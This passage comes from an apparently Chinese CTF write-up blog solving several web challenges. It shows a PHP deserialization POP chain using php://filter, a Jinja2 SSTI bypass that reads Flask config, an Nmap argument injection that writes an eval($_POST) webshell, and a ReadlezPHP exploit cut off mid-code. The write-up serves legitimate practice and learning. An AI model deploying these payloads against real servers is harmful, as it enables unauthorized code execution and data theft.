class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个pop链的构造</p><p><strong>思路</strong></p><p>先看一下Modifier类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">//这里的include函数，可以让我们来进行php伪协议，这里是第一个突破口。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;<span class="comment">//调用函数的方式调用一个对象时的回应方法</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里可以利用include来传入一个php伪协议来访问flag.php，然后通过一系列的方法来进行调用。</p><p>_invoke函数被调用时会触发include函数。</p><p>这里的include函数是触发漏洞的最后一步。</p><p>那么如何调用invoke呢。</p><p>这里我们可以看Test类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有_get()魔术方法。</p><p>这里直接将t h i s − &gt; p 进 行 了 调 用 。 这 里 将 this-&gt;p进行了调用。这里将this−&gt;p进行了调用。这里将this-&gt;p设为一个构造好的Modifier对象。</p><p>然后在看show类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;<span class="comment">//在一个对象被当作一个字符串使用时调用，当echo一个对象时会自动触发这个方法。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;<span class="comment">//使用了黑名单过滤了一下http协议的东西，但是不影响咱们的php伪协议。</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>show类中的__construct()魔术方法</p><p>创建新对象的时候会自动调用这个方法</p><p>主要利用__toString() 这个魔术方法</p><p>在一个对象被当作一个字符串使用时调用，当echo一个对象时会自动触发这个方法。返回了$this-&gt;str-&gt;source;</p><p>所以要echo include()里的内容</p><p>的让source等于一个对象<br><strong>最终思路</strong></p><p>向pop传值→触发unserialize函数→触发<code>__wakeup</code>→触发对象当作字符串用→触发<code>__toString</code>→触发调用不可读取属性→触发<code>__get</code>→触发对象当作函数使用→触发<code>__invoke</code>→调用append，append里有include文件包含</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123; </span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$var</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$source</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$p</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="variable">$a</span>-&gt;source=<span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str=<span class="keyword">new</span> <span class="title class_">Test</span>(); </span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> <span class="title class_">Modifier</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是一道ssti   jnjia2模板的考题</p><p>我们查看源码，可以知道我们提交的参数之中的<code>()</code>会被置为空，同时会将黑名单内的内容遍历一遍，把参数内的与黑名单相同的置为<code>None</code></p><p>如果没有黑名单的时候，我们可以使用<code>config</code>，传入 <code>config</code>，或者使用<code>self</code>，传入 <code>&#123;&#123;self.__dict__&#125;&#125;</code></p><p>当<code>config</code>,<code>self</code>,<code>()</code>都被过滤的时候，为了获取讯息，我们需要读取一些例如<code>current_app</code>这样的全局变量。</p><p>看了其他师傅的WP，python的沙箱逃逸这里的方法是<code>利用python对象之间的引用关系来调用被禁用的函数对象</code>。</p><p>这里有两个函数包含了<code>current_app</code>全局变量，<code>url_for</code>和<code>get_flashed_messages</code></p><p>这里和常规的ssti不同的地方在于  这里执行命令的方法是</p><p><code>return flask.render_template_string(safe_jinja(shrine))</code></p><p>常规的是<code>eval()</code></p><p><img src="../images/image-20230408210526834.png" alt="image-20230408210526834"></p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>题目</p><p><img src="../images/image-20230408211012509.png" alt="image-20230408211012509"></p><p>先抓个包看一下运行流程，首先index.php用了POST传参传过去一个host参数，然后本地又发起了一个GET请求，传了一个参数f=90131，通过修改此参数，发现PHP报错 simplexml_load_file(): I/O warning : failed to load external entity “xml/90132” in <strong>/var/www/html/result.php</strong> on line <strong>23</strong></p><p>simplexml_load_file() 函数是把 XML 文档载入对象中，所以初步猜想，应该是nmap将扫描的结果保存为了xml文档，然后PHP再打开该文档解析，后台命令可能为nmap -oX 127.0.0.1 ./xml/????</p><p>这里就需要稍微了解一下nmap的指令了，稍微在网上收集了一些常用命令，以便后面查阅：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">nmap -v 127.0.0.1给出了远程机器更详细的信息，显示冗余信息(扫描细节)</span><br><span class="line">nmap -iL nmaptest.txt 运行带“iL” 选项的nmap命令来扫描文件中列出的所有IP地址</span><br><span class="line">nmap 192.168.0.* --exclude 192.168.0.100使用“-exclude”选项来排除某些你不想要扫描的主机</span><br><span class="line">nmap -A 192.168.0.101启用操作系统和版本检测，脚本扫描和路由跟踪功能</span><br><span class="line">nmap -O 127.0.0.1使用选项“-O”和“-osscan-guess”也帮助探测操作系统信息</span><br><span class="line">nmap -sA 192.168.0.101扫描远程主机以探测该主机是否使用了包过滤器或防火墙</span><br><span class="line">nmap -PN 192.168.0.101扫描主机检测其是否受到数据包过滤软件或防火墙的保护</span><br><span class="line">nmap -sP 192.168.0.*找出网络中的在线主机</span><br><span class="line">nmap -F 192.168.0.101快速扫描，仅扫描nmap-services文件中的端口而避开所有其它的端口</span><br><span class="line">nmap -f 192.168.96.4使用小数据包发送，避免被识别出</span><br><span class="line">nmap -r 192.168.0.101不会随机的选择端口扫描</span><br><span class="line">nmap -p 80,443 192.168.0.101使用“-P”选项指定你想要扫描的端口</span><br><span class="line">nmap -sV 192.168.0.101查找主机服务版本号</span><br><span class="line">nmap -PS 192.168.0.101使用TCP ACK和TCP Syn方法来扫描远程主机（防火墙会阻断标ICMP包）</span><br><span class="line">nmap -Pn 192.168.96.4  目标机禁用ping，绕过ping扫描</span><br><span class="line">nmap -sn 192.168.96.4对目标进行ping检测，不进行端口扫描（发送四种报文确定目标是否存活）</span><br><span class="line">nmap -sS 192.168.0.101执行一次隐蔽的扫描，安全，快</span><br><span class="line">nmap -sT 192.168.0.101使用TCP Syn扫描最常用的端口，不安全，慢</span><br><span class="line">nmap -sN 192.168.0.101执行TCP空扫描以骗过防火墙</span><br><span class="line">nmap -sI 僵尸ip 目标ip使用僵尸机对目标机发送数据包</span><br><span class="line">nmap 192.168.96.4 -oX myscan.xml对扫描结果另存在myscan.xml</span><br><span class="line">nmap -T1~6 192.168.96.4设置扫描速度，一般T4足够</span><br><span class="line">nmap –mtu &lt;size&gt; 192.168.96.4发送的包大小,最大传输单元必须是8的整数</span><br><span class="line">nmap -D &lt;假ip&gt; 192.168.96.4发送参杂着假ip的数据包检测</span><br><span class="line">继续中断扫描：</span><br><span class="line">nmap –oG 1.txt –v 192.168.1.1/24-oG将扫描结果保存为TXT，Ctrl+C中断扫描</span><br><span class="line">Nmap –resume 1.txt作用：继续扫描</span><br></pre></td></tr></table></figure><p>看了很多资料后，知道了，nmap可以将扫描后的结果保存为文件，这个文件格式甚至可以自己决定，那岂不是可以直接尝试写一句话木马了。。。。</p><p>把nmap保存文件的一些方法截下来：</p><p><img src="../images/image-20230408213113606.png" alt="image-20230408213113606"></p><p>本地测试了一些，nmap保存文件的方法</p><p>真刑啊，文件的后缀可以自己决定，文件内容里还包含了我们输入的查询内容。</p><p>回到题目，之前我们猜测了nmap 127.0.0.1 -oX ./xml/????</p><p>其中127.0.0.1是我们控制的，那我们尝试改成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;?php eval($_POST[&quot;pwd&quot;]);?&gt; -oG 1.php&#x27;</span></span><br></pre></td></tr></table></figure><p>测试后发现被拦截了，可能是PHP关键字被拦截了，也可能是oG被禁用了，先试着绕php，后缀可以将php改成phtml</p><p>文件的内容&lt;?php中的PHP如何替换上网去查了一下，解决方法是使用短标签&lt;?=</p><p>最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &lt;?= @eval($_POST[&quot;pwd&quot;]);?&gt; -oG 1.phtml &#x27;</span></span><br></pre></td></tr></table></figure><p>进行了escapeshellarg()与escapeshellcmd()函数处理保护，没法产生文件</p><p>这就是为什么要加引号的原因</p><p>这和之前的一题有点像 </p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>题目</p><p><img src="../images/image-20230408213950745.png" alt="image-20230408213950745"></p><p>查看源码发现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">enc</span>(<span class="params">code</span>)&#123;</span><br><span class="line">  hash = <span class="title function_">hex_md5</span>(code);</span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> code = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;vcode&quot;</span>).<span class="property">value</span>;</span><br><span class="line">  <span class="keyword">if</span> (code != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">hex_md5</span>(code) == <span class="string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">&quot;您通过了验证！&quot;</span>);</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;./flag.php&quot;</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">&quot;你的授权码不正确！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;请输入授权码&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就直接去访问flag.php</p><p><img src="../images/image-20230408214236511.png" alt="image-20230408214236511"></p><p>这两点进行了提示</p><p><img src="../images/image-20230408214359417.png" alt="image-20230408214359417"></p><p>最后拿到了flag</p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>题目</p><p><img src="../images/image-20230408214513042.png" alt="image-20230408214513042"></p><p><img src="../images/image-20230408214635383.png" alt="image-20230408214635383"></p><p>发现了题目给的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2023</span>-<span class="number">04</span>-<span class="number">08</span> <span class="number">01</span>:<span class="number">46</span>:<span class="number">38</span></span><br></pre></td></tr></table></figure><p>这里话直接构造system(xxxx)的话是不行的，因为system被过滤了</p><p>首先这里需要利用<a href="https://so.csdn.net/so/search?q=assert&amp;spm=1001.2101.3001.7020">assert</a>函数，assert会判断应该表达式是否成立，返回true或false，is_numeric函数将检测变量是否为数字或数字字符串，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230408215138117.png" alt="image-20230408215138117"></p><p>phpinfo(true)   或者   phpinfo(1)  都是可以直接执行的    还有一个小知识点  phpinfo() 执行是会返回1的   也就是true</p><p><img src="../images/image-20230408215820893.png" alt="image-20230408215820893"></p><p>也是会执行的</p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span 